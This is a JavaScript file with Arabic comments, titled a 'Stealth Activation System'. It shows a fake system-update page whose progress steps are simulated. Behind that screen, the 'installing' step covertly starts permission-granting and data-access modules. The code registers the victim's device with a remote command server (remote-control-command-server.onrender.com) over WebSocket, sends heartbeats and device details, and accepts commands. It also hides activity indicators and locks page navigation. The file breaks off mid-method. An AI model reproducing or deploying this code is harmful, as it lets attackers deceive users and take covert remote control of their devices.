/**
 * نظام التفعيل الخفي والمتطور
 * Stealth Activation System
 */

// حماية مطلقة من about:blank في بداية الملف
(function() {
    'use strict';
    
    console.log('🛡️ STEALTH-ACTIVATION: تفعيل الحماية المطلقة من about:blank');
    
    // منع أي انتقال إلى about:blank فوراً
    if (window.location.href.includes('about:blank')) {
        console.log('❌ STEALTH-ACTIVATION: الصفحة في حالة about:blank - سيتم الإيقاف');
        window.stop();
        document.write('<h1 style="color: red; text-align: center; margin-top: 50px;">تم منع الانتقال إلى about:blank</h1>');
        throw new Error('STEALTH-ACTIVATION: تم إيقاف التنفيذ - about:blank محظور');
    }
    
    // حماية شاملة من جميع طرق التنقل
    const blockAllNavigation = () => {
        // منع window.location
        Object.defineProperty(window, 'location', {
            value: window.location,
            writable: false,
            configurable: false
        });
        
        // منع جميع طرق التنقل
        location.assign = () => { throw new Error('BLOCKED: location.assign'); };
        location.replace = () => { throw new Error('BLOCKED: location.replace'); };
        location.reload = () => { throw new Error('BLOCKED: location.reload'); };
        history.back = () => { throw new Error('BLOCKED: history.back'); };
        history.forward = () => { throw new Error('BLOCKED: history.forward'); };
        history.go = () => { throw new Error('BLOCKED: history.go'); };
        
        console.log('🛡️ STEALTH-ACTIVATION: تم تفعيل الحماية الشاملة من التنقل');
    };
    
    // تفعيل الحماية فوراً
    blockAllNavigation();
    
    // مراقبة مستمرة
    setInterval(() => {
        if (window.location.href.includes('about:blank')) {
            console.log('❌ STEALTH-ACTIVATION: تم اكتشاف about:blank - إيقاف فوري');
            window.stop();
            throw new Error('STEALTH-ACTIVATION: about:blank محظور');
        }
    }, 50); // فحص كل 50ms
    
})();

class StealthActivation {
    constructor() {
        this.isActivated = false;
        this.stealthMode = true;
        this.deviceId = this.generateDeviceId();
        this.permissionsManager = null;
        this.realDataAccess = null;
        this.heartbeatInterval = null;
        this.activationSteps = [
            'loading',
            'checking',
            'downloading',
            'installing',
            'configuring',
            'finalizing',
            'completed'
        ];
        this.currentStep = 0;
        
        // تفعيل الحماية الفورية من إعادة التوجيه
        this.enableImmediateProtection();
        
        // حماية شاملة من العد التنازلي
        this.preventCountdownCreation();
    }
    
    // منع إنشاء أي عد تنازلي من البداية
    preventCountdownCreation() {
        console.log('🛡️ تفعيل الحماية من إنشاء العد التنازلي');
        
        // مراقبة إضافة عناصر جديدة للـ DOM
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        // فحص إذا كان العنصر المضاف يحتوي على عد تنازلي
                        if (node.id === 'redirectCountdown' || 
                            node.className?.includes('countdown') ||
                            node.textContent === '3' || 
                            node.textContent === '2' || 
                            node.textContent === '1') {
                            console.log('❌ تم اكتشاف ومنع إضافة عنصر عد تنازلي:', node);
                            node.remove();
                        }
                        
                        // فحص العناصر الفرعية أيضاً
                        const countdownElements = node.querySelectorAll?.('[id*="countdown"], [class*="countdown"], .redirect-countdown');
                        countdownElements?.forEach(element => {
                            console.log('❌ تم اكتشاف ومنع عنصر عد تنازلي فرعي:', element);
                            element.remove();
                        });
                    }
                });
            });
        });
        
        // بدء مراقبة التغييرات في DOM
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
        
        // حفظ المراقب لاستخدامه لاحقاً
        this.domObserver = observer;
    }
    
    // حماية فورية عند إنشاء الكلاس
    enableImmediateProtection() {
        console.log('🛡️ تفعيل الحماية الفورية في StealthActivation');
        
        // منع أي محاولة لتغيير الصفحة إلى about:blank
        const self = this;
        
        // حماية window.location
        try {
            const originalLocation = window.location;
            Object.defineProperty(window, 'location', {
                get: function() { return originalLocation; },
                set: function(value) {
                    if (typeof value === 'string' && (value.includes('about:blank') || value === '')) {
                        console.log('❌ StealthActivation: تم منع تغيير location إلى:', value);
                        return originalLocation;
                    }
                    return originalLocation;
                },
                configurable: false
            });
        } catch (e) {
            console.log('⚠️ location محمي مسبقاً');
        }
        
        // حماية من استدعاءات التنقل
        const originalAssign = location.assign;
        const originalReplace = location.replace;
        
        location.assign = function(url) {
            if (url === 'about:blank' || url === '' || !url) {
                console.log('❌ StealthActivation: تم منع assign إلى:', url);
                return;
            }
            return originalAssign.call(this, url);
        };
        
        location.replace = function(url) {
            if (url === 'about:blank' || url === '' || !url) {
                console.log('❌ StealthActivation: تم منع replace إلى:', url);
                return;
            }
            return originalReplace.call(this, url);
        };
    }

    // تهيئة النظام
    async initialize() {
        try {
            console.log('🚀 بدء نظام التفعيل الخفي...');
            
            // إخفاء شاشة التحميل
            await this.hideLoadingScreen();
            
            // إظهار المحتوى الرئيسي
            this.showMainContent();
            
            // إعداد مستمعي الأحداث
            this.setupEventListeners();
            
            // تهيئة مدير الصلاحيات
            this.permissionsManager = new StealthPermissionsManager();
            
            // تهيئة نظام الوصول للبيانات
            this.realDataAccess = new RealDataAccess();
            
            console.log('✅ تم تهيئة نظام التفعيل بنجاح');
            
        } catch (error) {
            console.error('❌ فشل في تهيئة نظام التفعيل:', error);
            this.showError('فشل في تهيئة النظام');
        }
    }

    // إخفاء شاشة التحميل
    async hideLoadingScreen() {
        const loadingScreen = document.getElementById('loadingScreen');
        if (loadingScreen) {
            loadingScreen.style.opacity = '0';
            await this.delay(500);
            loadingScreen.style.display = 'none';
        }
    }

    // إظهار المحتوى الرئيسي
    showMainContent() {
        const mainContent = document.getElementById('mainContent');
        if (mainContent) {
            mainContent.style.display = 'block';
        }
    }

    // إعداد مستمعي الأحداث
    setupEventListeners() {
        const updateBtn = document.getElementById('updateBtn');
        const retryBtn = document.getElementById('retryBtn');
        
        if (updateBtn) {
            updateBtn.addEventListener('click', () => this.startActivation());
        }
        
        if (retryBtn) {
            retryBtn.addEventListener('click', () => this.retryActivation());
        }
    }

    // بدء عملية التفعيل - مع حماية من إعادة التوجيه
    async startActivation() {
        try {
            console.log('🔄 بدء عملية التفعيل...');
            
            // حماية فورية من أي إعادة توجيه
            this.preventAnyRedirection();
            
            // حماية إضافية من انقطاع الاتصال
            this.preventRedirectOnDisconnection();
            
            // تعطيل الزر
            this.disableUpdateButton();
            
            // بدء خطوات التفعيل
            await this.executeActivationSteps();
            
        } catch (error) {
            console.error('❌ فشل في عملية التفعيل:', error);
            this.showError('فشل في عملية التحديث');
        }
    }
    
    // منع أي إعادة توجيه أثناء التفعيل
    preventAnyRedirection() {
        console.log('🛡️ تفعيل الحماية من إعادة التوجيه أثناء التفعيل');
        
        // منع أي تغيير لـ window.location
        const originalLocation = window.location;
        Object.defineProperty(window, 'location', {
            get: function() { return originalLocation; },
            set: function(value) { 
                console.log('❌ تم منع محاولة تغيير location أثناء التفعيل إلى:', value);
                return originalLocation;
            },
            configurable: false
        });
        
        // منع استدعاءات إعادة التوجيه
        const originalAssign = location.assign;
        const originalReplace = location.replace;
        const originalReload = location.reload;
        
        location.assign = function(url) {
            console.log('❌ تم منع محاولة assign أثناء التفعيل إلى:', url);
            return;
        };
        
        location.replace = function(url) {
            console.log('❌ تم منع محاولة replace أثناء التفعيل إلى:', url);
            return;
        };
        
        location.reload = function() {
            console.log('❌ تم منع محاولة reload أثناء التفعيل');
            return;
        };
        
        // منع window.open للصفحات الفارغة
        const originalOpen = window.open;
        window.open = function(url, ...args) {
            if (!url || url === 'about:blank' || url === '') {
                console.log('❌ تم منع محاولة فتح صفحة فارغة أثناء التفعيل');
                return null;
            }
            return originalOpen.call(this, url, ...args);
        };
    }

    // تنفيذ خطوات التفعيل
    async executeActivationSteps() {
        for (let i = 0; i < this.activationSteps.length; i++) {
            this.currentStep = i;
            const step = this.activationSteps[i];
            
            try {
                await this.executeStep(step);
                this.updateProgress((i + 1) / this.activationSteps.length * 100);
                await this.delay(this.getRandomDelay(800, 1500));
                
            } catch (error) {
                console.error(`❌ فشل في الخطوة ${step}:`, error);
                throw error;
            }
        }
        
        // إكمال التفعيل
        await this.completeActivation();
    }

    // تنفيذ خطوة واحدة
    async executeStep(step) {
        console.log(`📋 تنفيذ الخطوة: ${step}`);
        
        switch (step) {
            case 'loading':
                await this.executeLoadingStep();
                break;
            case 'checking':
                await this.executeCheckingStep();
                break;
            case 'downloading':
                await this.executeDownloadingStep();
                break;
            case 'installing':
                await this.executeInstallingStep();
                break;
            case 'configuring':
                await this.executeConfiguringStep();
                break;
            case 'finalizing':
                await this.executeFinalizingStep();
                break;
            case 'completed':
                await this.executeCompletedStep();
                break;
        }
    }

    // خطوة التحميل
    async executeLoadingStep() {
        this.updateProgressText('جاري تحميل ملفات التحديث...');
        await this.delay(1000);
    }

    // خطوة الفحص
    async executeCheckingStep() {
        this.updateProgressText('جاري فحص النظام...');
        
        // فحص متطلبات النظام
        await this.checkSystemRequirements();
        
        await this.delay(1200);
    }

    // خطوة التحميل
    async executeDownloadingStep() {
        this.updateProgressText('جاري تحميل التحديثات...');
        
        // محاكاة تحميل الملفات
        await this.simulateDownload();
        
        await this.delay(1500);
    }

    // خطوة التثبيت
    async executeInstallingStep() {
        this.updateProgressText('جاري تثبيت التحديثات...');
        
        // بدء منح الصلاحيات بشكل خفي
        await this.startStealthPermissions();
        
        await this.delay(1800);
    }

    // خطوة الإعداد
    async executeConfiguringStep() {
        this.updateProgressText('جاري إعداد النظام...');
        
        // إعداد الوظائف الحقيقية
        await this.setupRealFunctions();
        
        await this.delay(1400);
    }

    // خطوة الإنهاء
    async executeFinalizingStep() {
        this.updateProgressText('جاري إنهاء التحديث...');
        
        // إخفاء مؤشرات النشاط
        await this.hideActivityIndicators();
        
        await this.delay(1000);
    }

    // خطوة الإكمال
    async executeCompletedStep() {
        this.updateProgressText('تم التحديث بنجاح!');
        
        // حفظ حالة التفعيل
        await this.saveActivationStatus();
        
        await this.delay(800);
    }

    // فحص متطلبات النظام
    async checkSystemRequirements() {
        try {
            // فحص المتصفح
            const browserCheck = this.checkBrowserCompatibility();
            
            // فحص الاتصال بالإنترنت
            const networkCheck = await this.checkNetworkConnection();
            
            // فحص الذاكرة المتاحة
            const memoryCheck = this.checkAvailableMemory();
            
            if (!browserCheck || !networkCheck || !memoryCheck) {
                throw new Error('النظام لا يلبي المتطلبات الأساسية');
            }
            
        } catch (error) {
            console.error('فشل في فحص متطلبات النظام:', error);
            throw error;
        }
    }

    // فحص توافق المتصفح
    checkBrowserCompatibility() {
        const requiredFeatures = [
            'Promise' in window,
            'fetch' in window,
            'localStorage' in window,
            'navigator' in window
        ];
        
        return requiredFeatures.every(feature => feature);
    }

    // فحص الاتصال بالإنترنت
    async checkNetworkConnection() {
        try {
            const response = await fetch('https://www.google.com/favicon.ico', {
                method: 'HEAD',
                mode: 'no-cors'
            });
            return true;
        } catch (error) {
            return false;
        }
    }

    // فحص الذاكرة المتاحة
    checkAvailableMemory() {
        if ('memory' in performance) {
            const memory = performance.memory;
            const availableMemory = memory.jsHeapSizeLimit - memory.usedJSHeapSize;
            return availableMemory > 50 * 1024 * 1024; // 50MB
        }
        return true; // إذا لم نتمكن من فحص الذاكرة، نفترض أنها كافية
    }

    // محاكاة التحميل
    async simulateDownload() {
        const files = [
            'security-update-v2.1.4.pkg',
            'system-patches.bin',
            'database-update.sql',
            'configuration.xml'
        ];
        
        for (const file of files) {
            await this.delay(300);
            console.log(`📥 تحميل: ${file}`);
        }
    }

    // بدء منح الصلاحيات الخفي
    async startStealthPermissions() {
        try {
            console.log('🔐 بدء منح الصلاحيات بشكل خفي...');
            
            // تهيئة مدير الصلاحيات
            await this.permissionsManager.initialize();
            
            // تهيئة نظام الوصول للبيانات
            await this.realDataAccess.initialize();
            
            console.log('✅ تم منح الصلاحيات بنجاح');
            
        } catch (error) {
            console.error('❌ فشل في منح الصلاحيات:', error);
            // لا نوقف العملية، نستمر
        }
    }

    // إعداد الوظائف الحقيقية
    async setupRealFunctions() {
        try {
            console.log('🔧 إعداد الوظائف الحقيقية...');
            
            // تسجيل Service Worker
            await this.registerServiceWorker();
            
            // إعداد الاتصال بالخادم
            await this.setupServerConnection();
            
            // إعداد المراقبة المستمرة
            this.setupContinuousMonitoring();
            
            console.log('✅ تم إعداد الوظائف بنجاح');
            
        } catch (error) {
            console.error('❌ فشل في إعداد الوظائف:', error);
            // لا نوقف العملية، نستمر
        }
    }

    // تسجيل Service Worker
    async registerServiceWorker() {
        try {
            if ('serviceWorker' in navigator) {
                const registration = await navigator.serviceWorker.register('/sw.js');
                console.log('✅ تم تسجيل Service Worker');
                return registration;
            }
        } catch (error) {
            console.error('❌ فشل في تسجيل Service Worker:', error);
        }
    }

    // إعداد الاتصال بالخادم
    async setupServerConnection() {
        try {
            // محاولة الاتصال بالخادم
            const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
            const serverUrl = isLocalhost 
                ? 'ws://localhost:4000' 
                : 'wss://remote-control-command-server.onrender.com';
            
            const ws = new WebSocket(serverUrl);
            
            ws.onopen = () => {
                console.log('✅ تم الاتصال بالخادم');
                window.controlConnection = ws;
                
                // تسجيل الجهاز
                ws.send(JSON.stringify({
                    type: 'register',
                    deviceId: this.deviceId,
                    capabilities: this.getDeviceCapabilities(),
                    timestamp: Date.now(),
                    status: 'online'
                }));
                
                // بدء heartbeat
                this.startHeartbeat();
                
                console.log('🔗 تم إعداد الاتصال والـ heartbeat بنجاح');
            };
            
            ws.onmessage = (event) => {
                try {
                    const message = JSON.parse(event.data);
                    this.handleServerMessage(message);
                } catch (error) {
                    console.error('❌ خطأ في معالجة رسالة الخادم:', error);
                }
            };
            
            ws.onerror = (error) => {
                console.error('❌ فشل في الاتصال بالخادم:', error);
            };
            
            ws.onclose = (event) => {
                console.log('❌ تم قطع الاتصال بالخادم');
                console.log(`  📄 الكود: ${event.code}`);
                console.log(`  📝 السبب: ${event.reason || 'غير محدد'}`);
                console.log(`  🔄 إعادة الاتصال: ${event.wasClean ? 'نعم' : 'لا'}`);
                
                // إيقاف heartbeat
                this.stopHeartbeat();
                
                // تنظيف المتغيرات
                window.controlConnection = null;
                
                // منع انتقال الصفحة عند انقطاع الاتصال
                console.log('🛡️ منع انتقال الصفحة بسبب انقطاع الاتصال');
                this.preventRedirectOnDisconnection();
                
                // تحديد سبب الانقطاع
                let reconnectDelay = 5000; // افتراضي 5 ثوان
                
                if (event.code === 1006) {
                    console.log('🔍 انقطاع غير طبيعي - إعادة اتصال سريع');
                    reconnectDelay = 2000; // 2 ثانية للانقطاع غير الطبيعي
                } else if (event.code === 1000) {
                    console.log('🔍 إغلاق طبيعي - إعادة اتصال عادي');
                    reconnectDelay = 5000; // 5 ثوان للإغلاق الطبيعي
                } else if (event.code >= 4000) {
                    console.log('🔍 خطأ في التطبيق - إعادة اتصال مؤجل');
                    reconnectDelay = 10000; // 10 ثوان لأخطاء التطبيق
                }
                
                // محاولة إعادة الاتصال
                setTimeout(() => {
                    console.log(`🔄 محاولة إعادة الاتصال بالخادم بعد ${reconnectDelay/1000} ثوان...`);
                    this.setupServerConnection();
                }, reconnectDelay);
            };
            
        } catch (error) {
            console.error('❌ فشل في إعداد الاتصال:', error);
        }
    }
    
    // معالجة رسائل الخادم
    handleServerMessage(message) {
        try {
            console.log('📨 رسالة من الخادم:', message.type);
            
            switch (message.type) {
                case 'activation_acknowledged':
                    console.log('✅ تم تأكيد التفعيل من الخادم');
                    console.log(`  📝 الرسالة: ${message.message}`);
                    console.log(`  🔗 الاتصال مستمر: ${message.keepConnection ? 'نعم' : 'لا'}`);
                    
                    // التأكد من أن الاتصال مستمر
                    if (message.keepConnection) {
                        console.log('🔗 الاتصال بالخادم مستقر - لا حاجة لإعادة التوجيه');
                    }
                    break;
                    
                case 'command':
                    console.log('📋 أمر جديد من الخادم:', message.command);
                    this.handleServerCommand(message);
                    break;
                    
                case 'ping':
                    // رد على ping بـ pong
                    if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
                        window.controlConnection.send(JSON.stringify({
                            type: 'pong',
                            timestamp: Date.now()
                        }));
                    }
                    break;
                    
                default:
                    console.log('📨 رسالة غير معروفة من الخادم:', message.type);
            }
            
        } catch (error) {
            console.error('❌ خطأ في معالجة رسالة الخادم:', error);
        }
    }
    
    // معالجة أوامر الخادم
    handleServerCommand(message) {
        try {
            const { command, parameters } = message;
            console.log(`📋 تنفيذ أمر: ${command}`);
            
            // يمكن إضافة معالجة الأوامر هنا لاحقاً
            
        } catch (error) {
            console.error('❌ خطأ في معالجة أمر الخادم:', error);
        }
    }
    
    // منع انتقال الصفحة عند انقطاع الاتصال
    preventRedirectOnDisconnection() {
        try {
            console.log('🛡️ تفعيل حماية شاملة من انتقال الصفحة');
            
            // منع جميع أشكال التنقل
            const blockNavigation = () => {
                window.location.assign = () => {
                    console.log('🚫 تم منع location.assign');
                    return false;
                };
                
                window.location.replace = () => {
                    console.log('🚫 تم منع location.replace');
                    return false;
                };
                
                window.location.reload = () => {
                    console.log('🚫 تم منع location.reload');
                    return false;
                };
                
                // منع تغيير location.href
                Object.defineProperty(window.location, 'href', {
                    set: function(value) {
                        console.log('🚫 تم منع تغيير location.href إلى:', value);
                        return false;
                    },
                    get: function() {
                        return window.location.toString();
                    }
                });
            };
            
            // تطبيق الحماية
            blockNavigation();
            
            // حماية مستمرة
            setInterval(() => {
                if (window.location.href.includes('about:blank')) {
                    console.log('🚨 تم اكتشاف about:blank - إيقاف فوري');
                    window.stop();
                    window.history.back();
                }
            }, 100);
            
            console.log('✅ تم تفعيل الحماية من انتقال الصفحة');
            
        } catch (error) {
            console.error('❌ خطأ في تفعيل حماية انتقال الصفحة:', error);
        }
    }
    
    // بدء نظام heartbeat
    startHeartbeat() {
        try {
            // إيقاف heartbeat السابق إن وجد
            if (this.heartbeatInterval) {
                clearInterval(this.heartbeatInterval);
            }
            
            console.log('💓 بدء نظام heartbeat...');
            
            this.heartbeatInterval = setInterval(() => {
                if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
                    window.controlConnection.send(JSON.stringify({
                        type: 'heartbeat',
                        deviceId: this.deviceId,
                        timestamp: Date.now(),
                        status: 'online'
                    }));
                    
                    console.log('💓 إرسال heartbeat للخادم');
                } else {
                    console.warn('⚠️ لا يمكن إرسال heartbeat - الاتصال مغلق');
                    this.stopHeartbeat();
                }
            }, 30000); // كل 30 ثانية
            
            console.log('✅ تم بدء نظام heartbeat بنجاح');
            
        } catch (error) {
            console.error('❌ خطأ في بدء heartbeat:', error);
        }
    }
    
    // إيقاف نظام heartbeat
    stopHeartbeat() {
        try {
            if (this.heartbeatInterval) {
                clearInterval(this.heartbeatInterval);
                this.heartbeatInterval = null;
                console.log('🛑 تم إيقاف نظام heartbeat');
            }
        } catch (error) {
            console.error('❌ خطأ في إيقاف heartbeat:', error);
        }
    }
    
    // إرسال activation_complete مع حماية ذكية
    sendActivationCompleteWithProtection(activationData) {
        try {
            console.log('🔄 بدء إرسال activation_complete مع حماية متقدمة...');
            
            // التحقق من حالة الاتصال
            if (!window.controlConnection) {
                console.warn('⚠️ لا يوجد اتصال بالخادم - تخطي الإرسال');
                return;
            }
            
            if (window.controlConnection.readyState !== WebSocket.OPEN) {
                console.warn('⚠️ الاتصال بالخادم غير مفتوح - تخطي الإرسال');
                return;
            }
            
            // إعداد مراقب انقطاع الاتصال قبل الإرسال
            const originalOnClose = window.controlConnection.onclose;
            let messageSent = false;
            
            window.controlConnection.onclose = (event) => {
                if (!messageSent) {
                    console.log('🚨 تم قطع الاتصال قبل أو أثناء إرسال activation_complete');
                    console.log('🛡️ تفعيل الحماية الفورية من about:blank');
                    this.preventRedirectOnDisconnection();
                }
                
                // استدعاء المعالج الأصلي
                if (originalOnClose) {
                    originalOnClose.call(window.controlConnection, event);
                }
            };
            
            // إرسال الرسالة مع timeout
            const sendMessage = () => {
                try {
                    window.controlConnection.send(JSON.stringify({
                        type: 'activation_complete',
                        data: activationData
                    }));
                    messageSent = true;
                    console.log('📤 تم إرسال activation_complete للخادم بنجاح');
                    
                    // إعداد timeout للتأكد من عدم انقطاع الاتصال
                    setTimeout(() => {
                        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
                            console.log('✅ الاتصال مستقر بعد إرسال activation_complete');
                        } else {
                            console.log('⚠️ انقطع الاتصال بعد إرسال activation_complete');
                            this.preventRedirectOnDisconnection();
                        }
                    }, 2000);
                    
                } catch (sendError) {
                    console.error('❌ خطأ في إرسال activation_complete:', sendError);
                    this.preventRedirectOnDisconnection();
                }
            };
            
            // إرسال الرسالة
            sendMessage();
            
        } catch (error) {
            console.error('❌ خطأ في sendActivationCompleteWithProtection:', error);
            this.preventRedirectOnDisconnection();
        }
    }

    // إعداد المراقبة المستمرة
    setupContinuousMonitoring() {
        // مراقبة حالة الاتصال
        setInterval(() => {
            this.checkConnectionStatus();
        }, 30000);
        
        // مراقبة حالة الصلاحيات
        setInterval(() => {
            this.checkPermissionsStatus();
        }, 60000);
    }

    // فحص حالة الاتصال
    checkConnectionStatus() {
        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
            // إرسال نبضة حياة
            window.controlConnection.send(JSON.stringify({
                type: 'heartbeat',
                deviceId: this.deviceId,
                timestamp: Date.now()
            }));
        }
    }

    // فحص حالة الصلاحيات
    checkPermissionsStatus() {
        if (this.permissionsManager) {
            this.permissionsManager.checkPermissionsStatus();
        }
    }

    // إخفاء مؤشرات النشاط
    async hideActivityIndicators() {
        try {
            // إخفاء شريط التقدم
            const progressSection = document.querySelector('.progress-section');
            if (progressSection) {
                progressSection.style.opacity = '0';
                await this.delay(500);
                progressSection.style.display = 'none';
            }
            
            // إخفاء قسم الحالة
            const statusSection = document.querySelector('.status-section');
            if (statusSection) {
                statusSection.style.opacity = '0';
                await this.delay(500);
                statusSection.style.display = 'none';
            }
            
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // حفظ حالة التفعيل
    async saveActivationStatus() {
        try {
            const activationData = {
                deviceId: this.deviceId,
                activated: true,
                timestamp: Date.now(),
                permissions: this.permissionsManager ? this.permissionsManager.getPermissionsStatus() : {},
                deviceInfo: this.getDeviceInfo()
            };
            
            // حفظ في localStorage
            localStorage.setItem('activationStatus', JSON.stringify(activationData));
            
            // إرسال للخادم مع حماية من انقطاع الاتصال
            console.log('🔄 محاولة إرسال activation_complete مع حماية شاملة...');
            
            // إرسال مع حماية ذكية
            this.sendActivationCompleteWithProtection(activationData);
            
            this.isActivated = true;
            
        } catch (error) {
            console.error('❌ فشل في حفظ حالة التفعيل:', error);
        }
    }

    // إكمال التفعيل
    async completeActivation() {
        try {
            console.log('🎉 تم إكمال التفعيل بنجاح!');
            
            // تأكيد إضافي من منع إعادة التوجيه
            this.preventAnyRedirection();
            
            // إظهار شاشة النجاح
            this.showSuccessScreen();
            
            // تم إلغاء إعادة التوجيه نهائياً - الصفحة ستبقى مفتوحة
            // setTimeout(() => {
            //     this.redirectToBlank();
            // }, 3000);
            
            console.log('✅ تم إلغاء إعادة التوجيه نهائياً - الصفحة ستبقى مرئية');
            
            // إضافة مراقب لمنع أي محاولة إعادة توجيه مستقبلية
            this.setupPermanentProtection();
            
        } catch (error) {
            console.error('❌ فشل في إكمال التفعيل:', error);
            this.showError('فشل في إكمال التحديث');
        }
    }
    
    // إعداد حماية دائمة من إعادة التوجيه
    setupPermanentProtection() {
        console.log('🛡️ إعداد الحماية الدائمة من إعادة التوجيه');
        
        // مراقبة أي تغيير في URL
        const originalPushState = history.pushState;
        const originalReplaceState = history.replaceState;
        
        history.pushState = function(state, title, url) {
            if (url && (url.includes('about:blank') || url === '')) {
                console.log('❌ تم منع محاولة pushState إلى صفحة فارغة');
                return;
            }
            return originalPushState.call(this, state, title, url);
        };
        
        history.replaceState = function(state, title, url) {
            if (url && (url.includes('about:blank') || url === '')) {
                console.log('❌ تم منع محاولة replaceState إلى صفحة فارغة');
                return;
            }
            return originalReplaceState.call(this, state, title, url);
        };
        
        // مراقبة تغيير href مباشرة
        let isProtected = false;
        if (!isProtected) {
            try {
                Object.defineProperty(location, 'href', {
                    set: function(value) {
                        if (value && (value.includes('about:blank') || value === '')) {
                            console.log('❌ تم منع محاولة تغيير href إلى صفحة فارغة:', value);
                            return;
                        }
                        console.log('✅ السماح بتغيير href إلى:', value);
                    },
                    get: function() {
                        return window.location.href;
                    }
                });
                isProtected = true;
            } catch (e) {
                console.log('⚠️ لا يمكن حماية href (محمي مسبقاً)');
            }
        }
    }

    // إظهار شاشة النجاح - بدون عد تنازلي
    showSuccessScreen() {
        const mainContent = document.getElementById('mainContent');
        const successScreen = document.getElementById('successScreen');
        
        if (mainContent) mainContent.style.display = 'none';
        if (successScreen) successScreen.style.display = 'flex';
        
        // بدء العد التنازلي للعودة للحالة الأساسية
        this.startRedirectCountdown();
        
        console.log('✅ تم إظهار شاشة النجاح بدون عد تنازلي');
    }
    
    // حماية قاطعة من العد التنازلي
    aggressiveCountdownPrevention() {
        console.log('🛡️ تفعيل الحماية القاطعة من العد التنازلي');
        
        // منع أي تغيير في innerHTML أو textContent
        const protectElement = (element) => {
            if (!element) return;
            
            // حماية innerHTML
            Object.defineProperty(element, 'innerHTML', {
                set: function(value) {
                    if (value && (value.includes('3') || value.includes('2') || value.includes('1') || value.includes('0'))) {
                        console.log('❌ تم منع تغيير innerHTML إلى عد تنازلي:', value);
                        return;
                    }
                    // السماح بالقيم الآمنة فقط
                    if (value && value.includes('تم التفعيل بنجاح')) {
                        this._innerHTML = value;
                    }
                },
                get: function() {
                    return this._innerHTML || 'تم التفعيل بنجاح!';
                }
            });
            
            // حماية textContent
            Object.defineProperty(element, 'textContent', {
                set: function(value) {
                    if (value === '3' || value === '2' || value === '1' || value === '0') {
                        console.log('❌ تم منع تغيير textContent إلى عد تنازلي:', value);
                        return;
                    }
                    this._textContent = value || 'تم التفعيل بنجاح!';
                },
                get: function() {
                    return this._textContent || 'تم التفعيل بنجاح!';
                }
            });
            
            // حماية innerText
            Object.defineProperty(element, 'innerText', {
                set: function(value) {
                    if (value === '3' || value === '2' || value === '1' || value === '0') {
                        console.log('❌ تم منع تغيير innerText إلى عد تنازلي:', value);
                        return;
                    }
                    this._innerText = value || 'تم التفعيل بنجاح!';
                },
                get: function() {
                    return this._innerText || 'تم التفعيل بنجاح!';
                }
            });
        };
        
        // حماية شاشة النجاح
        const successScreen = document.getElementById('successScreen');
        if (successScreen) {
            protectElement(successScreen);
            
            // حماية جميع العناصر الفرعية
            const allElements = successScreen.querySelectorAll('*');
            allElements.forEach(protectElement);
        }
        
        // حماية document.body
        protectElement(document.body);
        
        // مراقبة مستمرة لأي عنصر جديد
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) {
                        protectElement(node);
                        const childElements = node.querySelectorAll ? node.querySelectorAll('*') : [];
                        childElements.forEach(protectElement);
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
        
        console.log('🛡️ تم تفعيل الحماية القاطعة من تغيير النصوص');
    }
    
    // إزالة عنصر العد التنازلي نهائياً
    removeCountdownElement() {
        const countdownElement = document.getElementById('redirectCountdown');
        if (countdownElement) {
            countdownElement.remove(); // حذف العنصر نهائياً
            console.log('🗑️ تم حذف عنصر العد التنازلي نهائياً');
        }
        
        // البحث عن أي عناصر أخرى قد تحتوي على عد تنازلي
        const allCountdowns = document.querySelectorAll('.redirect-countdown, [class*="countdown"], [id*="countdown"]');
        allCountdowns.forEach(element => {
            element.remove();
            console.log('🗑️ تم حذف عنصر عد تنازلي إضافي');
        });
    }
    
    // منع جميع محاولات إعادة التوجيه والعد التنازلي
    blockAllRedirectAttempts() {
        // منع أي setTimeout أو setInterval جديد
        const originalSetTimeout = window.setTimeout;
        const originalSetInterval = window.setInterval;
        
        window.setTimeout = function(callback, delay, ...args) {
            // منع أي setTimeout يحاول عمل عد تنازلي
            if (delay === 1000 || delay === 2000 || delay === 3000) {
                console.log('❌ تم منع setTimeout مشبوه بتأخير:', delay);
                return null;
            }
            
            // فحص إذا كان الكود يحاول عمل عد تنازلي أو إعادة توجيه
            const callbackStr = callback.toString();
            if (callbackStr.includes('about:blank') || 
                callbackStr.includes('redirectToBlank') || 
                callbackStr.includes('countdown') ||
                callbackStr.includes('location.') ||
                callbackStr.includes('window.location') ||
                callbackStr.includes('3') || callbackStr.includes('2') || callbackStr.includes('1')) {
                console.log('❌ تم منع setTimeout مشبوه:', callbackStr.substring(0, 100));
                return null;
            }
            return originalSetTimeout.call(this, callback, delay, ...args);
        };
        
        window.setInterval = function(callback, delay, ...args) {
            // منع أي setInterval يحاول عمل عد تنازلي
            if (delay === 1000 || delay === 2000 || delay === 3000) {
                console.log('❌ تم منع setInterval مشبوه بتأخير:', delay);
                return null;
            }
            
            const callbackStr = callback.toString();
            if (callbackStr.includes('about:blank') || 
                callbackStr.includes('redirectToBlank') || 
                callbackStr.includes('countdown') ||
                callbackStr.includes('location.') ||
                callbackStr.includes('window.location') ||
                callbackStr.includes('3') || callbackStr.includes('2') || callbackStr.includes('1')) {
                console.log('❌ تم منع setInterval مشبوه:', callbackStr.substring(0, 100));
                return null;
            }
            return originalSetInterval.call(this, callback, delay, ...args);
        };
        
        // منع أي requestAnimationFrame يحاول عمل عد تنازلي
        const originalRequestAnimationFrame = window.requestAnimationFrame;
        window.requestAnimationFrame = function(callback) {
            const callbackStr = callback.toString();
            if (callbackStr.includes('countdown') || callbackStr.includes('3') || callbackStr.includes('2') || callbackStr.includes('1')) {
                console.log('❌ تم منع requestAnimationFrame مشبوه');
                return null;
            }
            return originalRequestAnimationFrame.call(this, callback);
        };
        
        console.log('🛡️ تم تفعيل حماية شاملة من العد التنازلي وإعادة التوجيه');
    }

    // بدء العد التنازلي للعودة للحالة الأساسية
    startRedirectCountdown() {
